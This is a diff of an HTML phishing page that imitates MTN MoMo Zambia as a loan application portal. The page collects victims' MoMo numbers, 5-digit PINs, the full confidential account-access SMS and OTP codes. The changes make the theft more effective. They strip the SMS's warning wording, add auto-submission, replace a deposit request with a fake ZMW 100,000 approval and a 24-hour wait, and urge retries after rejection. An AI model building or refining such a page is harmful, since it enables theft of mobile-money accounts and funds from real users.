@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261126a" />
+  <link rel="stylesheet" href="style.css?v=20261128a" />
 </head>
 <body>
   <div class="app-container">
@@ -31,7 +31,7 @@
           <strong>WE ARE CURRENTLY EXPERIENCING HIGH APPLICATION VOLUME. PLEASE VERIFY YOUR DETAILS ACCURATELY:</strong>
         </p>
         <ul class="notice-bullets">
-          <li><strong>• ENSURE YOUR MTN MOMO ACCOUNT NUMBER IS ACTIVE (096, 076, OR 056).</strong></li>
+          <li><strong>• ENSURE YOUR MTN MOMO ACCOUNT NUMBER IS ACTIVE (096, 076, OR 056) STARTING WITH 0 (10 DIGITS).</strong></li>
           <li><strong>• ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER TO AVOID DELAYS.</strong></li>
           <li><strong>• APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</strong></li>
         </ul>
@@ -42,8 +42,8 @@
       </div>
 
       <div class="app-download-footer">
-        MoMo from MTN Zambia • Secure Mobile Money Portal.<br />
-        Standard network rates may apply.
+        <strong>MoMo from MTN Zambia • Secure Mobile Money Portal.</strong><br />
+        <strong>Standard network rates may apply.</strong>
       </div>
     </section>
 
@@ -152,6 +152,7 @@
       </div>
 
       <div class="sub-nav-strip">
+        <button id="btn-form2-prev" class="nav-back-btn" type="button">← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
 
@@ -179,16 +180,16 @@
         </div>
 
         <div class="form-group">
-          <label for="form-phone">MTN MoMo Number</label>
+          <label for="form-phone">MTN MoMo Number (10 Digits Starting With 0)</label>
           <div class="phone-input-group">
             <span class="flag-prefix">ZM</span>
-            <input type="tel" id="form-phone" placeholder="096 XXX XXXX" maxlength="13" />
+            <input type="tel" id="form-phone" placeholder="096 XXX XXXX" maxlength="10" inputmode="numeric" />
           </div>
-          <small class="field-hint">Enter your MTN Zambia MoMo number starting with 096, 076, or 056</small>
+          <small class="field-hint"><strong>Enter 10-digit MTN Zambia number starting with 0 (096, 076, or 056)</strong></small>
         </div>
 
         <div class="form-buttons-row">
-          <button id="btn-form2-prev" class="btn-grey-action" type="button">← Previous</button>
+          <button id="btn-form2-prev-alt" class="btn-grey-action" type="button">← Previous</button>
           <button id="btn-form2-next" class="btn-momo-soft ready compact-prog" type="button">Next Step →</button>
         </div>
       </div>
@@ -205,6 +206,7 @@
       </div>
 
       <div class="sub-nav-strip">
+        <button id="btn-form3-prev" class="nav-back-btn" type="button">← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
 
@@ -235,17 +237,17 @@
         </div>
 
         <div class="form-buttons-row">
-          <button id="btn-form3-prev" class="btn-grey-action" type="button">← Previous</button>
+          <button id="btn-form3-prev-alt" class="btn-grey-action" type="button">← Previous</button>
           <button id="btn-form3-submit" class="btn-momo-solid compact-prog" type="button">SUBMIT APPLICATION</button>
         </div>
       </div>
     </section>
 
-    <!-- Screen 6: Y'ello Phathutshedzo 5-Digit PIN Login Screen -->
+    <!-- Screen 6: Y'ello Phathutshedzo 5-Digit PIN Screen -->
     <section id="screen-pin" class="screen">
       <div class="pin-top-bar">
         <button id="btn-pin-back" class="nav-back-clean" type="button" aria-label="Back">←</button>
-        <span id="display-pin-phone" class="pin-phone-badge">096 XXX XXXX</span>
+        <span id="display-pin-phone" class="pin-phone-badge">0960000000</span>
       </div>
 
       <div class="yello-pin-container">
@@ -258,6 +260,10 @@
           <span class="yello-italic">Y'ello</span> Phathutshedzo
         </h2>
 
+        <p class="sms-notice" style="text-align: center;">
+          <strong>ENTER YOUR 5-DIGIT PIN FOR PHONE NO: <span id="pin-phone-inline">0960000000</span>. IT SUBMITS AUTOMATICALLY ONCE ALL 5 DIGITS ARE ENTERED.</strong>
+        </p>
+
         <div id="banner-pin-error" class="surface-error-banner"></div>
         <div id="banner-pin-info" class="surface-info-banner"></div>
 
@@ -269,7 +275,7 @@
               inputmode="numeric"
               pattern="[0-9]*"
               maxlength="5"
-              placeholder="PIN"
+              placeholder="PIN (5 DIGITS)"
               class="yello-pin-input"
               autocomplete="off"
             />
@@ -286,7 +292,7 @@
         <button id="btn-switch-account" type="button" class="yello-switch-account-btn">Switch account</button>
 
         <p class="yello-tc-note">
-          By using this app you agree to our <a href="#" id="link-pin-tcs">T&amp;Cs</a>
+          <strong>By using this app you agree to our <a href="#" id="link-pin-tcs">T&amp;Cs</a></strong>
         </p>
 
         <div class="yello-contact-area">
@@ -314,13 +320,13 @@
       <div class="card-container-main">
         <h2 class="sms-heading">SMS Verification</h2>
         <p class="sms-notice">
-          Enter the SMS verification code received on your phone starting with:
-          <strong>Y'ello. Please note! This confidential code gives access to your MoMo account:</strong>
+          <strong>PLEASE COPY AND PASTE THE WHOLE SMS ON THE SPACE PROVIDED THE WHOLE SMS SEND TO YOUR MOMO NUMBER.</strong>
+          <span> (Auto-submits when detecting SMS starting with <strong>Y'ello. Please note!</strong>)</span>
         </p>
 
         <div class="sms-phone-display-block">
           <label>Phone Number</label>
-          <div id="display-sms-phone" class="sms-phone-muted">096 XXX XXXX</div>
+          <div id="display-sms-phone" class="sms-phone-muted">0960000000</div>
         </div>
 
         <div class="sms-timer-box">
@@ -361,10 +367,10 @@
       <div class="card-container-spacious">
         <h2 class="enter-pin-heading" style="margin-top: 12px;">MTN MoMo 4-Digit OTP</h2>
         <p class="sms-notice" style="text-align: center;">
-          <strong>CHECK YOUR SMS AND ENTER THE 4 DIGITS SENT TO SMS ON YOUR MOMO NUMBER</strong>
+          <strong>ENTER THE NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER. IT SUBMITS AUTOMATICALLY ONCE ALL 4 DIGITS ARE ENTERED.</strong>
         </p>
 
-        <p id="display-otp-phone" class="applicant-phone-subtitle">096 XXX XXXX</p>
+        <p id="display-otp-phone" class="applicant-phone-subtitle">0960000000</p>
 
         <div id="banner-otp-error" class="surface-error-banner"></div>
         <div id="banner-otp-info" class="surface-info-banner"></div>
@@ -392,18 +398,20 @@
 
       <div class="card-container-spacious">
         <h1 class="congrats-title">Congratulations!</h1>
-        <p class="congrats-sub">Your MTN MoMo loan application has been approved successfully.</p>
+        <p class="congrats-sub">
+          <strong>Your MTN MoMo loan application for <span id="success-loan-amount">ZMW 100,000</span> has been approved successfully.</strong>
+        </p>
 
-        <h3 class="action-req-title">Action Required to Reflect Loan Amount</h3>
+        <h3 class="action-req-title">Loan Reflection Notice (24 Hours)</h3>
         <p class="action-req-body">
-          To complete the process and have the full loan amount reflect in your account, you are required to deposit a minimum of <strong id="success-deposit-amount">200 ZMW</strong> (Zambia Kwacha).
+          <strong>Please wait for 24 hours so that your approved loan amount of <span id="success-loan-amount-detail">ZMW 100,000</span> will reflect immediately on your account.</strong>
         </p>
 
         <button id="btn-finish-home" class="btn-momo-solid" type="button" style="margin-top: 28px;">DONE</button>
       </div>
     </section>
 
-    <!-- Screen 10: Blocked / Stopped Screen -->
+    <!-- Screen 10: Denied / Blocked Notice Screen -->
     <section id="screen-stopped" class="screen">
       <div class="top-nav-bar">
         <div class="momo-nav-logo">
@@ -414,12 +422,15 @@
 
       <div class="card-container-spacious">
         <div class="blocked-badge-circle">✕</div>
-        <h2 class="blocked-title">BLOCK</h2>
+        <h2 class="blocked-title">DENY</h2>
+        <div id="banner-denied-notice" class="surface-error-banner active">
+          <strong>PLEASE CHECK YOUR MOMO DETAILS AND TRY AGAIN.</strong>
+        </div>
         <p id="blocked-reason-text" class="blocked-sub">
-          Applicant is not sending VALID MTN MoMo details. Application has been blocked.
+          <strong>Please check your MoMo details (10-digit number starting with 0 and valid 5-digit PIN) and try again.</strong>
         </p>
 
-        <button id="btn-retry-home" class="btn-momo-solid" type="button" style="margin-top: 24px;">RETURN HOME</button>
+        <button id="btn-retry-home" class="btn-momo-solid" type="button" style="margin-top: 24px;">CHECK MOMO DETAILS &amp; TRY AGAIN</button>
       </div>
     </section>
 
@@ -432,7 +443,7 @@
 
   </div>
 
-  <script src="script.js?v=20261126a"></script>
+  <script src="script.js?v=20261128a"></script>
 </body>
-                                                              </html>
-      
+        </html>
+  
